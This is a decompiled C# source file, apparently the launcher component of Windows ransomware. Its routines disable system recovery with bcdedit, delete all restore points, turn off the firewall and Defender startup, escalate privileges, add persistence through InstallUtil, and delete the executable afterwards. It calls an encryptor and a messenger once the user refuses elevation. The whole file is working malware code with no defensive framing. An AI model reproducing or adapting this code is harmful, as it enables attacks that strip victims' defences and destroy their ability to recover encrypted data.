using System;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.Management;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Windows.Forms;
using Microsoft.Win32;

namespace abc;

internal class Launcher
{
	[StructLayout(LayoutKind.Sequential, Pack = 1)]
	internal struct TokPriv1Luid
	{
		public int Count;

		public long Luid;

		public int Attr;
	}

	private const int ERROR_CANCELLED = 1223;

	private static string autoStartPath = Environment.GetFolderPath(Environment.SpecialFolder.Startup);

	private static string DISABLE_RECOVERY = "bcdedit /set {default} recoveryenabled No";

	private static string IGNORE_ALL_FAILURE = "bcdedit /set {default} bootstatuspolicy ignoreallfailures";

	internal const int SE_PRIVILEGE_ENABLED = 2;

	internal const int TOKEN_QUERY = 8;

	internal const int TOKEN_ADJUST_PRIVILEGES = 32;

	internal const string SE_TIME_ZONE_NAMETEXT = "SeTimeZonePrivilege";

	private static void disableUac()
	{
		try
		{
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", writable: true);
			if (registryKey == null)
			{
				registryKey = Registry.LocalMachine.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
			}
			registryKey.SetValue("EnableLUA", 1);
			registryKey.Close();
		}
		catch (UnauthorizedAccessException)
		{
		}
	}

	private static void disableSR()
	{
		try
		{
			ProcessStartInfo obj = new ProcessStartInfo("cmd.exe")
			{
				UseShellExecute = true,
				CreateNoWindow = true,
				WindowStyle = ProcessWindowStyle.Hidden,
				Arguments = DISABLE_RECOVERY,
				Verb = "runas"
			};
			Process.Start(obj);
			obj.Arguments = IGNORE_ALL_FAILURE;
			Process.Start(obj);
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("Software\\Policies\\Microsoft\\Windows NT\\SystemRestore");
			if (registryKey == null)
			{
				registryKey = Registry.LocalMachine.CreateSubKey("Software\\Policies\\Microsoft\\Windows NT\\SystemRestore");
			}
			if (registryKey.GetValue("DisableSR") == null || (int)registryKey.GetValue("DisableSR") != 1)
			{
				registryKey.SetValue("DisableSR", 1);
			}
			registryKey.Close();
		}
		catch (UnauthorizedAccessException)
		{
		}
	}

	public static void setAutoStartup()
	{
		string fileName = Path.Combine(RuntimeEnvironment.GetRuntimeDirectory(), "InstallUtil.exe");
		Process process = new Process();
		process.StartInfo.FileName = fileName;
		process.StartInfo.CreateNoWindow = true;
		process.StartInfo.Arguments = "/logfile= /LogToConsole=false /U \"" + Application.get_ExecutablePath() + "\"";
		process.Start();
		process.WaitForExit();
	}

	private static void disableNotification()
	{
		try
		{
			if (Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\{FD6905CE-952F-41F1-9A6F-135D9C6622CC}") != null)
			{
				Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\")!.DeleteSubKey("{ FD6905CE-952F-41F1-9A6F-135D9C6622CC}");
			}
		}
		catch (UnauthorizedAccessException)
		{
		}
	}

	private static void killFirewall()
	{
		try
		{
			Process process = new Process();
			string fileName = "cmd.exe";
			process.StartInfo.Arguments = "netsh.exe Firewall set opmode disable";
			process.StartInfo.FileName = fileName;
			process.StartInfo.UseShellExecute = true;
			process.StartInfo.Verb = "runas";
			process.StartInfo.RedirectStandardOutput = true;
			process.StartInfo.CreateNoWindow = true;
			process.Start();
		}
		catch
		{
		}
	}

	private static void selfDestruct()
	{
		Process.Start(new ProcessStartInfo
		{
			Arguments = "/C choice /C Y /N /D Y /T 3 & Del " + Application.get_ExecutablePath(),
			WindowStyle = ProcessWindowStyle.Hidden,
			CreateNoWindow = true,
			FileName = "cmd.exe"
		});
	}

	private static void disableDefender()
	{
		try
		{
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
			if (registryKey.GetValue("Windows Defender") != null)
			{
				registryKey.DeleteValue("Windows Defender");
			}
			registryKey.Close();
		}
		catch (UnauthorizedAccessException)
		{
		}
	}

	[DllImport("Srclient.dll")]
	private static extern int SRRemoveRestorePoint(int index);

	private static void EnumRestorePoints()
	{
		//IL_0005: Unknown result type (might be due to invalid IL or missing references)
		//IL_000f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0015: Expected O, but got Unknown
		//IL_0015: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		//IL_0022: Expected O, but got Unknown
		//IL_001d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0036: Unknown result type (might be due to invalid IL or missing references)
		ManagementScope val = new ManagementScope("\\\\localhost\\root\\default");
		ManagementPath val2 = new ManagementPath("SystemRestore");
		ObjectGetOptions val3 = new ObjectGetOptions();
		ManagementObjectEnumerator enumerator = new ManagementClass(val, val2, val3).GetInstances().GetEnumerator();
		try
		{
			while (enumerator.MoveNext())
			{
				int num = Convert.ToInt32((uint)((ManagementBaseObject)(ManagementObject)enumerator.get_Current()).get_Item("sequencenumber"));
				SRRemoveRestorePoint(num);
				Console.Out.Write(num);
			}
		}
		finally
		{
			((IDisposable)enumerator)?.Dispose();
		}
	}

	public static void RunProcessAsAdmin(string exePath)
	{
		ProcessStartInfo processStartInfo = new ProcessStartInfo(exePath);
		processStartInfo.CreateNoWindow = true;
		processStartInfo.UseShellExecute = true;
		processStartInfo.Verb = "runas";
		try
		{
			Process.Start(processStartInfo);
		}
		catch (Win32Exception ex)
		{
			if (ex.NativeErrorCode == 1223)
			{
				startUp();
				if (Encryptor.makeItHappen())
				{
					Messenger.sendMessage();
				}
				Environment.Exit(1);
				Application.Exit();
			}
		}
	}

	[DllImport("advapi32.dll", ExactSpelling = true, SetLastError = true)]
	internal static extern bool AdjustTokenPrivileges(IntPtr htok, bool disall, ref TokPriv1Luid newst, int len, IntPtr prev, IntPtr relen);

	[DllImport("kernel32.dll", ExactSpelling = true)]
	internal static extern IntPtr GetCurrentProcess();

	[DllImport("advapi32.dll", ExactSpelling = true, SetLastError = true)]
	internal static extern bool OpenProcessToken(IntPtr h, int acc, ref IntPtr phtok);

	[DllImport("advapi32.dll", SetLastError = true)]
	internal static extern bool LookupPrivilegeValue(string host, string name, ref long pluid);

	private static bool SetPriv()
	{
		try
		{
			IntPtr currentProcess = GetCurrentProcess();
			IntPtr phtok = IntPtr.Zero;
			OpenProcessToken(currentProcess, 40, ref phtok);
			TokPriv1Luid newst = default(TokPriv1Luid);
			newst.Count = 1;
			newst.Luid = 0L;
			newst.Attr = 2;
			LookupPrivilegeValue(null, "SeTimeZonePrivilege", ref newst.Luid);
			return AdjustTokenPrivileges(phtok, disall: false, ref newst, 0, IntPtr.Zero, IntPtr.Zero);
		}
		catch (Exception)
		{
			return false;
		}
	}

	public static void startUp()
	{
		setAutoStartup();
		SetPriv();
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			disableNotification();
			disableDefender();
			disableSR();
			killFirewall();
			disableUac();
			EnumRestorePoints();
		}
	}
}
